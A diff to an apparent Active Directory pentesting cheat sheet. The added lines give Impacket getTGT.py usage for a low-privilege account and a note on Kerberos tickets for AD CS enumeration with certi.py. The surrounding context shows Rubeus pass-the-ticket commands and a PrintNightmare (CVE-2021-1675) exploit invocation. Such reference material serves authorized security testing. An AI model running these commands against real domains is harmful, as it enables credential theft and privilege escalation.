@@ -378,6 +378,10 @@ Rubeus.exe asktgt /user:administrator /password:P@$$w0rd! /domain:contoso /ptt
 
 # With RC4 hash
 Rubeus.exe asktgt /user:administraot /rc4:<rc4-hash> /domain:contoso /ptt
+
+# Linux
+getTGT.py legitcorp.local/lowpriv:'P@$$w0rd' -dc-ip 192.168.86.170
+export KRB5CCNAME=lowpriv.ccache
 ```
 
 ### runas
@@ -566,6 +570,8 @@ python3 CVE-2021-1675.py testlab/testuser:'P@$$w0rd!'@10.10.10.10 '\\10.10.10.10
 ```
 
 ## PKI Abuse
+It is recommended to below commands with `-k` option with .cacche file. Please refer [Request TGT](#request-tgt) section
+
 ### Enumerate CA(s) on the domain
 ```
 python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --class ca
